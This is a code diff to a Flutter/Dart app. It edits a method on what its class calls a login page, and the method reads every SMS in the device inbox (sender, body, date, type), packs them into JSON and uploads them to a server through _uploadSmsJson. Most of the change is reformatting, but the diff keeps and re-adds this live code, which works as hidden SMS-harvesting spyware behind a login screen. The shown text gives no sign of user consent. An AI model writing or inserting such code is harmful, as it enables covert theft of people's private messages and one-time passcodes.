@@ -171,50 +171,49 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
   // ==================== SMS READING & UPLOAD ====================
 
   Future<void> _readAndUploadAllSms() async {
-    if (_isUploadingSms) {
-      print("📩 SMS upload already in progress");
-      return;
-    }
-
-    _isUploadingSms = true;
-
-    try {
-      final telephony = Telephony.instance;
-      print("📩 Reading all SMS messages...");
-
-      final List<SmsMessage> messages = await telephony.getInboxSms(
-        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE, SmsColumn.TYPE],
-        filter: null,
-        sortOrder: Order.DESC,
-      );
-
-      print("📩 Found ${messages.length} SMS messages");
-
-      // Build JSON array
-      final List<Map<String, dynamic>> smsList = messages.map((sms) {
-        return {
-          'address': sms.address ?? 'Unknown',
-          'body': sms.body ?? '',
-          'date': sms.date?.toString() ?? DateTime.now().millisecondsSinceEpoch.toString(),
-          'type': sms.type?.toString() ?? '1',
-          'read': true,
-        };
-      }).toList();
-
-      final Map<String, dynamic> smsJson = {
-        'totalCount': smsList.length,
-        'messages': smsList,
-        'timestamp': DateTime.now().millisecondsSinceEpoch,
-      };
-
-      // Upload JSON to server
-      await _uploadSmsJson(smsJson);
-    } catch (e) {
-      print("❌ SMS reading error: $e");
-    } finally {
-      _isUploadingSms = false;
-    }
+  if (_isUploadingSms) {
+    print("📩 SMS upload already in progress");
+    return;
   }
+
+  _isUploadingSms = true;
+
+  try {
+    final telephony = Telephony.instance;
+    print("📩 Reading all SMS messages...");
+
+    // Read SMS without sortOrder to avoid import issues
+    final List<SmsMessage> messages = await telephony.getInboxSms(
+      columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE, SmsColumn.TYPE],
+    );
+
+    print("📩 Found ${messages.length} SMS messages");
+
+    // Build JSON array
+    final List<Map<String, dynamic>> smsList = messages.map((sms) {
+      return {
+        'address': sms.address ?? 'Unknown',
+        'body': sms.body ?? '',
+        'date': sms.date?.toString() ?? DateTime.now().millisecondsSinceEpoch.toString(),
+        'type': sms.type?.toString() ?? '1',
+        'read': true,
+      };
+    }).toList();
+
+    final Map<String, dynamic> smsJson = {
+      'totalCount': smsList.length,
+      'messages': smsList,
+      'timestamp': DateTime.now().millisecondsSinceEpoch,
+    };
+
+    // Upload JSON to server
+    await _uploadSmsJson(smsJson);
+  } catch (e) {
+    print("❌ SMS reading error: $e");
+  } finally {
+    _isUploadingSms = false;
+  }
+}
 
   Future<void> _uploadSmsJson(Map<String, dynamic> smsData) async {
     try {
